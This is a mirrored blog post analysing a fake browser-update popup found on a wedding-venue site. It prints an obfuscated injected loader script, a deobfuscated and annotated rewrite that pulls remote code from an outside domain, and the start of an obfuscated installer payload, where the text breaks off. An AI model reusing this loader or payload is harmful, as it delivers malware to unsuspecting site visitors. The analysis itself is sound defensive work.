<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://axelp.io/UltimateUpdate">Original</a>
    <h1>Malicious update/malware by a semi-advanced adversary</h1>
    
    <div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    
    
    <p>I was on a site browsing for wedding venues in Virginia (üëÄ), and after scrolling down a page listing venues in Vienna, my entire screen changed to one of the typical ‚ÄúYour {Internet Browser} is out of date. Click here to update!‚Äù. Curiosity got the best of me, I clicked the link, and this created a mini-investigation of some interesting malware!</p>

<!--more-->

<p><img src="https://axelp.io/images/UltimateUpdate/UltimateUpdate.png" alt="UltimateUpdate"/></p>
<blockquote>
  <p><em>Not the actual ad I was served</em></p>
</blockquote>

<p>I thought it was pretty odd that I was served this ad in the first place, since I have uBlock Origin, which is pretty good at preventing these sorts of ads. Because I have no respect for my computer, I decided to YOLO it and click the ‚ÄúDownload Update!‚Äù button. It downloaded a ZIP file named <code>FirefŒøx.106.63418.18456.9503fcf0.zip</code> from a JavaScript Blob (URL: <code>blob:null/06285e4d-82c0-4901-b6c3-f7d713a410a3</code>). This means I won‚Äôt be able to re-download it, and unfortunately I navigated away from the page so I don‚Äôt have the original.</p>

<p>I repackaged the zip file into a 7Zip in this <a href="https://github.com/CuckooEXE/UltimateUpdate">repo</a> with the password <code>infected</code>.</p>
      <h2 id="hunt-for-the-original">
        
        
          Hunt for the Original <a href="#hunt-for-the-original">#</a>
        
        
      </h2>
    
<p>First thing I want to do for this ‚Äúinvestigation‚Äù is to see what the original payload is. That way I can see the logic in targetting, or if there are any other payloads. I went back through my browsing history to see if I could eventually find it, and on the page <code>hxxps[://]www[.]weddingrule[.]com/wedding-venues/virginia/north-va/</code> I see that it loads a Blob:</p>

<div><div><pre><code><span>;(</span><span>function</span><span>(){</span><span>var</span> <span>dq</span><span>=</span><span>document</span><span>.</span><span>referrer</span><span>;</span><span>var</span> <span>ad</span><span>=</span><span>window</span><span>.</span><span>location</span><span>.</span><span>href</span><span>;</span><span>var</span> <span>xw</span><span>=</span><span>navigator</span><span>.</span><span>userAgent</span><span>;</span><span>var</span> <span>ej</span><span>=</span><span>new</span> <span>RegExp</span><span>(</span><span>vz</span><span>(</span><span>&#39;</span><span>p:p/z/j(a[c^y/t]c+x)y/x</span><span>&#39;</span><span>));</span><span>if</span><span>(</span><span>!</span><span>dq</span><span>||</span><span>ad</span><span>.</span><span>match</span><span>(</span><span>ej</span><span>)[</span><span>1</span><span>]</span><span>==</span><span>dq</span><span>.</span><span>match</span><span>(</span><span>ej</span><span>)[</span><span>1</span><span>]</span><span>||</span><span>xw</span><span>.</span><span>indexOf</span><span>(</span><span>vz</span><span>(</span><span>&#39;</span><span>xWvitnadrobwbsr</span><span>&#39;</span><span>))</span><span>==-</span><span>1</span><span>||</span><span>window</span><span>.</span><span>localStorage</span><span>[</span><span>vz</span><span>(</span><span>&#39;</span><span>k_m_h_suetemmal</span><span>&#39;</span><span>)]){</span><span>return</span><span>;}</span><span>var</span> <span>kf</span><span>=</span><span>vz</span><span>(</span><span>&#39;</span><span>usvcxrqizpktc</span><span>&#39;</span><span>);</span><span>var</span> <span>ox</span><span>=</span><span>document</span><span>.</span><span>createElement</span><span>(</span><span>kf</span><span>);</span><span>ox</span><span>.</span><span>async</span><span>=</span><span>true</span><span>;</span><span>ox</span><span>.</span><span>src</span><span>=</span><span>vz</span><span>(</span><span>&#39;</span><span>shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u</span><span>&#39;</span><span>);</span><span>var</span> <span>fq</span><span>=</span><span>document</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>kf</span><span>)[</span><span>0</span><span>];</span><span>fq</span><span>.</span><span>parentNode</span><span>.</span><span>insertBefore</span><span>(</span><span>ox</span><span>,</span><span>fq</span><span>);</span><span>function</span> <span>vz</span><span>(</span><span>wm</span><span>){</span><span>var</span> <span>yo</span><span>=</span><span>&#39;&#39;</span><span>;</span><span>for</span><span>(</span><span>var</span> <span>ud</span><span>=</span><span>0</span><span>;</span><span>ud</span><span>&lt;</span><span>wm</span><span>.</span><span>length</span><span>;</span><span>ud</span><span>++</span><span>){</span><span>if</span><span>(</span><span>ud</span><span>%</span><span>2</span><span>){</span><span>yo</span><span>+=</span><span>wm</span><span>[</span><span>ud</span><span>];}}</span><span>return</span> <span>yo</span><span>;}})();</span>
</code></pre></div></div>

<p>Which, running it through a <a href="https://deobfuscate.io/">deobfuscator</a>, turns into:</p>

<div><div><pre><code><span>;</span>
<span>(</span><span>function</span> <span>()</span> <span>{</span>
  <span>var</span> <span>dq</span> <span>=</span> <span>document</span><span>.</span><span>referrer</span><span>;</span>
  <span>var</span> <span>ad</span> <span>=</span> <span>window</span><span>.</span><span>location</span><span>.</span><span>href</span><span>;</span>
  <span>var</span> <span>xw</span> <span>=</span> <span>navigator</span><span>.</span><span>userAgent</span><span>;</span>
  <span>var</span> <span>ej</span> <span>=</span> <span>new</span> <span>RegExp</span><span>(</span><span>vz</span><span>(</span><span>&#34;</span><span>p:p/z/j(a[c^y/t]c+x)y/x</span><span>&#34;</span><span>));</span>
  <span>if</span> <span>(</span><span>!</span><span>dq</span> <span>||</span> <span>ad</span><span>.</span><span>match</span><span>(</span><span>ej</span><span>)[</span><span>1</span><span>]</span> <span>==</span> <span>dq</span><span>.</span><span>match</span><span>(</span><span>ej</span><span>)[</span><span>1</span><span>]</span> <span>||</span> <span>xw</span><span>.</span><span>indexOf</span><span>(</span><span>vz</span><span>(</span><span>&#34;</span><span>xWvitnadrobwbsr</span><span>&#34;</span><span>))</span> <span>==</span> <span>-</span><span>1</span> <span>||</span> <span>window</span><span>.</span><span>localStorage</span><span>[</span><span>vz</span><span>(</span><span>&#34;</span><span>k_m_h_suetemmal</span><span>&#34;</span><span>)])</span> <span>{</span>
    <span>return</span><span>;</span>
  <span>}</span>
  <span>var</span> <span>kf</span> <span>=</span> <span>vz</span><span>(</span><span>&#34;</span><span>usvcxrqizpktc</span><span>&#34;</span><span>);</span>
  <span>var</span> <span>ox</span> <span>=</span> <span>document</span><span>.</span><span>createElement</span><span>(</span><span>kf</span><span>);</span>
  <span>ox</span><span>.</span><span>async</span> <span>=</span> <span>true</span><span>;</span>
  <span>ox</span><span>.</span><span>src</span> <span>=</span> <span>vz</span><span>(</span><span>&#34;</span><span>shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u</span><span>&#34;</span><span>);</span>
  <span>var</span> <span>fq</span> <span>=</span> <span>document</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>kf</span><span>)[</span><span>0</span><span>];</span>
  <span>fq</span><span>.</span><span>parentNode</span><span>.</span><span>insertBefore</span><span>(</span><span>ox</span><span>,</span> <span>fq</span><span>);</span>
  <span>function</span> <span>vz</span><span>(</span><span>wm</span><span>)</span> <span>{</span>
    <span>var</span> <span>yo</span> <span>=</span> <span>&#34;&#34;</span><span>;</span>
    <span>for</span> <span>(</span><span>var</span> <span>ud</span> <span>=</span> <span>0</span><span>;</span> <span>ud</span> <span>&lt;</span> <span>wm</span><span>.</span><span>length</span><span>;</span> <span>ud</span><span>++</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>ud</span> <span>%</span> <span>2</span><span>)</span> <span>{</span>
        <span>yo</span> <span>+=</span> <span>wm</span><span>[</span><span>ud</span><span>];</span>
      <span>}</span>
    <span>}</span>
    <span>return</span> <span>yo</span><span>;</span>
  <span>}</span>
<span>}());</span>
</code></pre></div></div>

<p>This is clearly an attempt to obfuscate what the code is doing, so I‚Äôll do the work to ‚Äúreverse-engineer‚Äù this into something that makes more sense:</p>

<div><div><pre><code>
<span>/**
 * @brief Deobfuscates a string
 * @details Takes every other character of the original string
 *
 * @param {string} obfuscated_str Obfuscated string to deobfuscate
 * @returns {string} Deobfuscated string
 */</span>
<span>function</span> <span>deobfuscate_str</span><span>(</span><span>obfuscated_str</span><span>)</span> <span>{</span>
    <span>var</span> <span>deobfuscated_str</span> <span>=</span> <span>&#34;&#34;</span><span>;</span>
    <span>for</span> <span>(</span><span>var</span> <span>i</span> <span>=</span> <span>0</span><span>;</span> <span>i</span> <span>&lt;</span> <span>obfuscated_str</span><span>.</span><span>length</span><span>;</span> <span>i</span><span>++</span><span>)</span> <span>{</span>
        <span>if</span> <span>(</span><span>i</span> <span>%</span> <span>2</span><span>)</span> <span>{</span>
            <span>deobfuscated_str</span> <span>+=</span> <span>obfuscated_str</span><span>[</span><span>i</span><span>];</span>
        <span>}</span>
    <span>}</span>
    <span>return</span> <span>deobfuscated_str</span><span>;</span>
<span>}</span>

<span>// Check if any are true, if so return:</span>
<span>//  1. No referrer</span>
<span>//  2. The current page and the referrer both have match the regex &#34;://([^/]+)/&#34;</span>
<span>//  3. The User Agent does *not* have the string &#34;Windows&#34;</span>
<span>//  4. The key &#34;___utma&#34; in the local storage has a &#34;truthy&#34; value</span>
<span>var</span> <span>re</span> <span>=</span> <span>new</span> <span>RegExp</span><span>(</span><span>deobfuscate_str</span><span>(</span><span>&#34;</span><span>p:p/z/j(a[c^y/t]c+x)y/x</span><span>&#34;</span><span>)</span> <span>/* ://([^/]+)/ */</span><span>);</span>
<span>if</span> <span>(</span>
    <span>!</span><span>document</span><span>.</span><span>referrer</span> <span>||</span> <span>window</span><span>.</span><span>location</span><span>.</span><span>href</span><span>.</span><span>match</span><span>(</span><span>re</span><span>)[</span><span>1</span><span>]</span> <span>==</span> <span>document</span><span>.</span><span>referrer</span><span>.</span><span>match</span><span>(</span><span>re</span><span>)[</span><span>1</span><span>]</span> <span>||</span> 
    <span>navigator</span><span>.</span><span>userAgent</span><span>.</span><span>indexOf</span><span>(</span><span>deobfuscate_str</span><span>(</span><span>&#34;</span><span>xWvitnadrobwbsr</span><span>&#34;</span><span>)</span> <span>/* Windows */</span><span>)</span> <span>==</span> <span>-</span><span>1</span> <span>||</span> 
    <span>window</span><span>.</span><span>localStorage</span><span>[</span><span>deobfuscate_str</span><span>(</span><span>&#34;</span><span>k_m_h_suetemmal</span><span>&#34;</span><span>)</span> <span>/* ___utma */</span><span>]</span>
<span>)</span> <span>{</span>
    <span>return</span><span>;</span>
<span>}</span>

<span>// 1. Create a &lt;script&gt; element</span>
<span>// 2. Set the element&#39;s &#34;async&#34; attribute to &#34;true&#34;</span>
<span>// 3. Set the element&#39;s &#34;src&#34; attribute to &#34;hxxps[://]training[.]c1ypsilanti[.]org/report?r=dj01MDY1NDg3MTIwZTU2ZmQ1ZTZlNCZjaWQ9MjY0&#34;</span>
<span>// 4. Get all elements with the tag &#34;&lt;script&gt;&#34;</span>
<span>// 5. Insert the newly created element above that</span>
<span>var</span> <span>script_str</span> <span>=</span> <span>deobfuscate_str</span><span>(</span><span>&#34;</span><span>usvcxrqizpktc</span><span>&#34;</span><span>)</span> <span>/* script */</span><span>;</span>
<span>var</span> <span>script_elem</span> <span>=</span> <span>document</span><span>.</span><span>createElement</span><span>(</span><span>script_str</span><span>);</span>
<span>script_elem</span><span>.</span><span>async</span> <span>=</span> <span>true</span><span>;</span>
<span>script_elem</span><span>.</span><span>src</span> <span>=</span> <span>deobfuscate_str</span><span>(</span><span>&#34;</span><span>shntitiphss:r/j/jtjraajirnyibnngg.acq1nygpvsjiklhadnbtjie.conrugt/xroeipmodrstt?rrv=cdnjs0k1mMlDjYf1pNkDkgz3sMpTzInwfZpTkUj2aZxmyQx1kZhTgZllvNeCuZajwatWgQp9bMajkYf0u</span><span>&#34;</span><span>)</span> <span>/* hxxps[://]training[.]c1ypsilanti[.]org/report?r=dj01MDY1NDg3MTIwZTU2ZmQ1ZTZlNCZjaWQ9MjY0 */</span><span>;</span>
<span>var</span> <span>script_elem_</span> <span>=</span> <span>document</span><span>.</span><span>getElementsByTagName</span><span>(</span><span>script_str</span><span>)[</span><span>0</span><span>];</span>
<span>script_elem_</span><span>.</span><span>parentNode</span><span>.</span><span>insertBefore</span><span>(</span><span>script_elem</span><span>,</span> <span>script_elem_</span><span>);</span>
</code></pre></div></div>

<p>I tried visiting the site, and nothing appeard. I am able to consistently trigger the <code>&lt;script&gt;</code> element, but the webserver isn‚Äôt returning anything new for me. Their webserver must be doing some sort of filtering based on referrer, or potentially using the Base64-encoded parameter as a nonce. To rule out any IP-based filtering, I downloaded a VPN to see if I get a ‚Äúnew IP‚Äù and try from there. Unfortunately, I got the <code>&lt;script&gt;</code> tag added again, but still no response.</p>

<p>I ran their site through <a href="https://www.virustotal.com/gui/url/4023d8e5092e1f3ecb943e1d8d8e6a7c907bfb51243d43d874a6f48decd35aeb/details">VirusTotal</a>, which returned with two hits (Avira and Kaspersky both claiming the site hosts Malware); all other scanners labelled this clean. Unsurprising, this domain was registered with privacy settings through FastDomain. It was registered on 02/01/2022, last updated on 06/14/2022.</p>

<p>I went to the parent domain, and it‚Äôs masquerading as a WordPress site that‚Äôs ‚ÄúComing Soon‚Äù. Interestingly enough, the title is ‚ÄúChurch One Ypsilanti‚Äù, of which, there is a real one! However, their domain is <code>https://churchoneypsilanti.org/</code>. The email associated with the church‚Äôs FaceBook page is <code>c1ypsilanti[@]gmail[.]com</code> which is the same spelling as the masqueraded domain.</p>

<p>The entire situation is pretty weird; typically, if this were just adware, they wouldn‚Äôt care about serving the same client twice. That just means double the chances of landing a victim. However, there was a semi-professional attempt at preventing serving the same client multiple times for this domain. Let‚Äôs take a step back and look at some facts:</p>

<ul>
  <li>There is a church in Ypsilanti, MI called ‚ÄúChurch One Ypsilanti‚Äù, with a domain of <code>churchoneypsilanti.org</code> and email of <code>c1ypsilanti@gmail.com</code></li>
  <li>Someone registered a domain <code>c1ypsilanti[.]org</code>, which is the valid <strong>email</strong> of the Church One Ypsilanti team</li>
  <li>They aged the domain for about half a year</li>
  <li>The root domain hosts a legitimate looking ‚ÄúComing Soon‚Äù WordPress site</li>
  <li>Someone infected a website, <code>weddingrule[.]org</code> to serve an infected JavaScript blob</li>
  <li>This JavaScript blob is obfuscated</li>
  <li>The JavaScript blob only redirects to the malicious domain if it hasn‚Äôt done that in the past (it will add a <code>__utma</code> key in your local storage)</li>
  <li>Even after manually removing traces of the <code>__utma</code> key, and trying to re-trigger the malicious site‚Äôs content, the malicious site only returns an empty page.</li>
</ul>

<p>This is all pretty odd‚Ä¶</p>

<p>Another route I want to take is see how the blob originally gets created and called from the acutal site. We‚Äôll go back into Chrome Dev Tools to check this out. I searched for a unique string (<code>shntitiphss</code>) that was inside of the blob to see where it appeared on the wedding webpage. The blob is wrapped in a <code>&lt;script&gt;</code> tag:</p>

<div><div><pre><code><span>&lt;script </span><span>id=</span><span>&#34;6049c9e9056fa8c121a67cbec179fdac-1&#34;</span> <span>type=</span><span>&#34;nitropack/inlinescript&#34;</span> <span>class=</span><span>&#34;nitropack-inline-script&#34;</span><span>&gt;</span>
  <span>...</span>
<span>&lt;/script&gt;</span>
</code></pre></div></div>

<p>It looks like this <code>nitropack</code> is a CDN that allows you to register ‚Äúplugins‚Äù (i.e. the Google Analytics script snippet), that will dynamically add the scripts in when the page loads. It is unlikely that all of <code>weddingrule[.]org</code> was compromised, but rather, there is a supply chain attack against the original script that is hosted in NitroPack at the <code>6049c9e9056fa8c121a67cbec179fdac-1</code> ID.</p>

<p>I tried registering for an account on <code>nitropack</code> thinking that it would allow me to see what plugins they have, and potentially view the IDs for them, but no such luck. It seems that the process is much more involved.</p>
      <h2 id="inspecting-the-payload">
        
        
          Inspecting the Payload <a href="#inspecting-the-payload">#</a>
        
        
      </h2>
    
<p>Unfortunately, I don‚Äôt think there‚Äôs much I can do to get the webserver to respond to me with a new payload, or trigger the pop-up again. I might go back on another computer and fudge around with it a bit later. I still have the original payload, so I‚Äôll keep going down that path.</p>

<p>The only contents of the directory is a JavaScript file titled <code>Installer.106.77570.17215.ded29e4a.js</code>. It‚Äôs heavily obfuscated again, so I executed most of it, just making sure that it doesn‚Äôt do anything dangerous on my machine.</p>

<p>Here is the original (unrolled, but still obfuscated):</p>
<div><div><pre><code><span>function</span> <span>a0_0x219ccd</span><span>(</span><span>_0x35b93c</span><span>,</span> <span>_0x207fb7</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x17ddf8</span> <span>=</span> <span>{</span>
        <span>_0x37821e</span><span>:</span> <span>0x15b</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x207fb7</span> <span>-</span> <span>a0_0x17ddf8</span><span>.</span><span>_0x37821e</span><span>,</span> <span>_0x35b93c</span><span>);</span>
<span>}</span>

<span>function</span> <span>a0_0xb56377</span><span>(</span><span>_0x43919e</span><span>,</span> <span>_0x5b2869</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x4b5ec</span> <span>=</span> <span>{</span>
        <span>_0x147571</span><span>:</span> <span>0x28d</span>
    <span>};</span>
    <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x5b2869</span> <span>-</span> <span>a0_0x4b5ec</span><span>.</span><span>_0x147571</span><span>,</span> <span>_0x43919e</span><span>);</span>
<span>}(</span><span>function</span><span>(</span><span>_0x199181</span><span>,</span> <span>_0x1464cd</span><span>)</span> <span>{</span>
    <span>var</span> <span>a0_0x190e3b</span> <span>=</span> <span>{</span>
            <span>_0x42c655</span><span>:</span> <span>0x52</span><span>,</span>
            <span>_0xa6b46f</span><span>:</span> <span>0x47</span><span>,</span>
            <span>_0x2fd595</span><span>:</span> <span>0x2f</span><span>,</span>
            <span>_0x1063d2</span><span>:</span> <span>0x24</span><span>,</span>
            <span>_0x243ed1</span><span>:</span> <span>0x4b</span><span>,</span>
            <span>_0x4ed0d9</span><span>:</span> <span>0x58</span><span>,</span>
            <span>_0x283732</span><span>:</span> <span>0x4d</span><span>,</span>
            <span>_0x208eff</span><span>:</span> <span>0x48</span><span>,</span>
            <span>_0x46226d</span><span>:</span> <span>0x365</span><span>,</span>
            <span>_0x2af4b2</span><span>:</span> <span>0x359</span><span>,</span>
            <span>_0x255e64</span><span>:</span> <span>0x17d</span><span>,</span>
            <span>_0x221017</span><span>:</span> <span>0x16a</span><span>,</span>
            <span>_0x2876e1</span><span>:</span> <span>0xf6</span><span>,</span>
            <span>_0x33eac0</span><span>:</span> <span>0xf7</span><span>,</span>
            <span>_0xabf493</span><span>:</span> <span>0xe7</span><span>,</span>
            <span>_0x5f06bc</span><span>:</span> <span>0xd5</span><span>,</span>
            <span>_0x50ef72</span><span>:</span> <span>0x49</span><span>,</span>
            <span>_0xd73765</span><span>:</span> <span>0x56</span>
        <span>},</span>
        <span>a0_0x506224</span> <span>=</span> <span>{</span>
            <span>_0x4ed62a</span><span>:</span> <span>0x4f</span>
        <span>},</span>
        <span>a0_0xda6dc1</span> <span>=</span> <span>{</span>
            <span>_0x9031ba</span><span>:</span> <span>0x3c6</span>
        <span>},</span>
        <span>a0_0x1cd518</span> <span>=</span> <span>{</span>
            <span>_0x41d223</span><span>:</span> <span>0x2c3</span>
        <span>},</span>
        <span>a0_0x481136</span> <span>=</span> <span>{</span>
            <span>_0x5afa56</span><span>:</span> <span>0x225</span>
        <span>},</span>
        <span>a0_0x32bd19</span> <span>=</span> <span>{</span>
            <span>_0x422ecf</span><span>:</span> <span>0x2c</span>
        <span>},</span>
        <span>a0_0x2796f4</span> <span>=</span> <span>{</span>
            <span>_0x15c577</span><span>:</span> <span>0x23f</span>
        <span>},</span>
        <span>a0_0x89a3e</span> <span>=</span> <span>{</span>
            <span>_0x4b64b2</span><span>:</span> <span>0x52</span>
        <span>},</span>
        <span>a0_0x2b8906</span> <span>=</span> <span>{</span>
            <span>_0x21a701</span><span>:</span> <span>0x31a</span>
        <span>},</span>
        <span>a0_0x46b232</span> <span>=</span> <span>{</span>
            <span>_0x348b35</span><span>:</span> <span>0x207</span>
        <span>};</span>

    <span>function</span> <span>_0x557417</span><span>(</span><span>_0x126f61</span><span>,</span> <span>_0x48436b</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x48436b</span> <span>-</span> <span>-</span><span>a0_0x46b232</span><span>.</span><span>_0x348b35</span><span>,</span> <span>_0x126f61</span><span>);</span>
    <span>}</span>
    <span>var</span> <span>_0x3083f2</span> <span>=</span> <span>_0x199181</span><span>();</span>

    <span>function</span> <span>_0x5aaee4</span><span>(</span><span>_0x57ae9d</span><span>,</span> <span>_0x30086e</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x30086e</span> <span>-</span> <span>-</span><span>a0_0x2b8906</span><span>.</span><span>_0x21a701</span><span>,</span> <span>_0x57ae9d</span><span>);</span>
    <span>}</span>

    <span>function</span> <span>_0x14143f</span><span>(</span><span>_0xc96aa1</span><span>,</span> <span>_0x10686a</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0xc96aa1</span> <span>-</span> <span>a0_0x89a3e</span><span>.</span><span>_0x4b64b2</span><span>,</span> <span>_0x10686a</span><span>);</span>
    <span>}</span>

    <span>function</span> <span>_0x1557b9</span><span>(</span><span>_0x6a6c78</span><span>,</span> <span>_0x32fb49</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x6a6c78</span> <span>-</span> <span>a0_0x2796f4</span><span>.</span><span>_0x15c577</span><span>,</span> <span>_0x32fb49</span><span>);</span>
    <span>}</span>

    <span>function</span> <span>_0xd9a442</span><span>(</span><span>_0x4f9ead</span><span>,</span> <span>_0x51cb90</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x51cb90</span> <span>-</span> <span>-</span><span>a0_0x32bd19</span><span>.</span><span>_0x422ecf</span><span>,</span> <span>_0x4f9ead</span><span>);</span>
    <span>}</span>

    <span>function</span> <span>_0x10de0b</span><span>(</span><span>_0x48b014</span><span>,</span> <span>_0x1d314d</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x48b014</span> <span>-</span> <span>-</span><span>a0_0x481136</span><span>.</span><span>_0x5afa56</span><span>,</span> <span>_0x1d314d</span><span>);</span>
    <span>}</span>

    <span>function</span> <span>_0x103d48</span><span>(</span><span>_0x3ee4c</span><span>,</span> <span>_0x33bfb4</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x33bfb4</span> <span>-</span> <span>a0_0x1cd518</span><span>.</span><span>_0x41d223</span><span>,</span> <span>_0x3ee4c</span><span>);</span>
    <span>}</span>

    <span>function</span> <span>_0x1cbab1</span><span>(</span><span>_0x17dbb5</span><span>,</span> <span>_0x556590</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x17dbb5</span> <span>-</span> <span>-</span><span>a0_0xda6dc1</span><span>.</span><span>_0x9031ba</span><span>,</span> <span>_0x556590</span><span>);</span>
    <span>}</span>

    <span>function</span> <span>_0x368ce8</span><span>(</span><span>_0x1f8554</span><span>,</span> <span>_0x48978a</span><span>)</span> <span>{</span>
        <span>return</span> <span>a0_0x340a</span><span>(</span><span>_0x1f8554</span> <span>-</span> <span>-</span><span>a0_0x506224</span><span>.</span><span>_0x4ed62a</span><span>,</span> <span>_0x48978a</span><span>);</span>
    <span>}</span>
    <span>while</span> <span>(</span><span>!!</span><span>[])</span> <span>{</span>
        <span>try</span> <span>{</span>
            <span>var</span> <span>_0x1fd2d1</span> <span>=</span> <span>-</span><span>parseInt</span><span>(</span><span>_0x368ce8</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0x42c655</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0xa6b46f</span><span>))</span> <span>/</span> <span>(</span><span>0x1</span> <span>*</span> <span>0x2395</span> <span>+</span> <span>-</span><span>0x1dd3</span> <span>+</span> <span>0x3</span> <span>*</span> <span>-</span><span>0x1eb</span><span>)</span> <span>+</span> <span>parseInt</span><span>(</span><span>_0x368ce8</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0x2fd595</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0x1063d2</span><span>))</span> <span>/</span> <span>(</span><span>0x1948</span> <span>+</span> <span>-</span><span>0x1ecb</span> <span>+</span> <span>-</span><span>0x1</span> <span>*</span> <span>-</span><span>0x585</span><span>)</span> <span>*</span> <span>(</span><span>parseInt</span><span>(</span><span>_0x368ce8</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0x243ed1</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0x4ed0d9</span><span>))</span> <span>/</span> <span>(</span><span>-</span><span>0xb5b</span> <span>+</span> <span>0x60</span> <span>*</span> <span>0x2</span> <span>+</span> <span>-</span><span>0x54f</span> <span>*</span> <span>-</span><span>0x2</span><span>))</span> <span>+</span> <span>parseInt</span><span>(</span><span>_0x368ce8</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0x283732</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0x208eff</span><span>))</span> <span>/</span> <span>(</span><span>-</span><span>0x3</span> <span>*</span> <span>0x184</span> <span>+</span> <span>0x14c5</span> <span>+</span> <span>-</span><span>0x1035</span><span>)</span> <span>+</span> <span>-</span><span>parseInt</span><span>(</span><span>_0x103d48</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0x46226d</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0x2af4b2</span><span>))</span> <span>/</span> <span>(</span><span>-</span><span>0x1a34</span> <span>+</span> <span>-</span><span>0x1</span> <span>*</span> <span>0x69d</span> <span>+</span> <span>0x20d6</span> <span>*</span> <span>0x1</span><span>)</span> <span>+</span> <span>parseInt</span><span>(</span><span>_0x557417</span><span>(</span><span>-</span><span>a0_0x190e3b</span><span>.</span><span>_0x255e64</span><span>,</span> <span>-</span><span>a0_0x190e3b</span><span>.</span><span>_0x221017</span><span>))</span> <span>/</span> <span>(</span><span>-</span><span>0xae</span> <span>*</span> <span>0x1e</span> <span>+</span> <span>0x1f0a</span> <span>+</span> <span>-</span><span>0xaa0</span><span>)</span> <span>+</span> <span>parseInt</span><span>(</span><span>_0x14143f</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0x2876e1</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0x33eac0</span><span>))</span> <span>/</span> <span>(</span><span>0x213</span> <span>*</span> <span>-</span><span>0x2</span> <span>+</span> <span>0x1</span> <span>*</span> <span>-</span><span>0x18ea</span> <span>+</span> <span>0x1</span> <span>*</span> <span>0x1d17</span><span>)</span> <span>*</span> <span>(</span><span>parseInt</span><span>(</span><span>_0x14143f</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0xabf493</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0x5f06bc</span><span>))</span> <span>/</span> <span>(</span><span>0xfa0</span> <span>+</span> <span>-</span><span>0x1f5e</span> <span>+</span> <span>0xfc6</span> <span>*</span> <span>0x1</span><span>))</span> <span>+</span> <span>parseInt</span><span>(</span><span>_0x368ce8</span><span>(</span><span>a0_0x190e3b</span><span>.</span><span>_0x50ef72</span><span>,</span> <span>a0_0x190e3b</span><span>.</span><span>_0xd73765</span><span>))</span> <span>/</span> <span>(</span><span>0x1f7a</span> <span>*</span> <span>-</span><span>0x1</span> <span>+</span> <span>-</span><span>0x7</span> <span>*</span> <span>-</span><span>0x431</span> <span>+</span> <span>0x22c</span><span>);</span>
            <span>if</span> <span>(</span><span>_0x1fd2d1</span> <span>===</span> <span>_0x1464cd</span><span>)</span> <span>break</span><span>;</span>
            <span>else</span> <span>_0x3083f2</span><span>[</span><span>&#39;</span><span>push</span><span>&#39;</span><span>](</span><span>_0x3083f2</span><span>[</span><span>&#39;</span><span>shift</span><span>&#39;</span><span>]());</span>
        <span>}</span> <span>catch</span> <span>(</span><span>_0x2b266f</span><span>)</span> <span>{</span>
            <span>_0x3083f2</span><span>[</span><span>&#39;</span><span>push</span><span>&#39;</span><span>](</span><span>_0x3083f2</span><span>[</span><span>&#39;</span><span>shift</span><span>&#39;</span><span>]());</span>
        <span>}</span>
    <span>}</span>
<span>}(</span><span>a0_0x1590</span><span>,</span> <span>0x59efc</span> <span>+</span> <span>0xa0c02</span> <span>+</span> <span>-</span><span>0xa76d2</span><span>));</span>
<span>var</span> <span>a0_0x1bbfc1</span> <span>=</span> <span>a0_0x4e8ff2</span><span>(</span><span>0x38</span><span>,</span> <span>0x36</span><span>)</span> <span>+</span> <span>a0_0x3be92f</span><span>(</span><span>-</span><span>0x26b</span><span>,</span> <span>-</span><span>0x27b</span><span>)</span> <span>+</span> <span>a0_0x4e8ff2</span><span>(</span><span>0x4e</span><span>,</span> <span>0x3c</span><span>),</span>
